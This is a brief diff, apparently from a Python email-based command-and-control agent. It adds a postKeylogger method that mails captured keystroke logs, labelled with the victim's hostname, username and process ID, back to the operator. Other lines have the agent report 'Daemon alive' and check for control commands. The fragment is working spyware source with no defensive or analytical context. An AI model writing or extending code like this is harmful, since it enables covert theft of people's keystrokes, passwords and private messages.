@@ -119,6 +119,10 @@ class EMailAgent(LocalAgent):
 		except Exception as e:
 			return "<control> No Command"             
 
+	def postKeylogger(self, log):
+		subject = "Keylogger: " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG)
+		self.sendEmail(subject, log);
+
 try:
 	agent = EMailAgent()
 	agent.postResponse("Daemon alive")
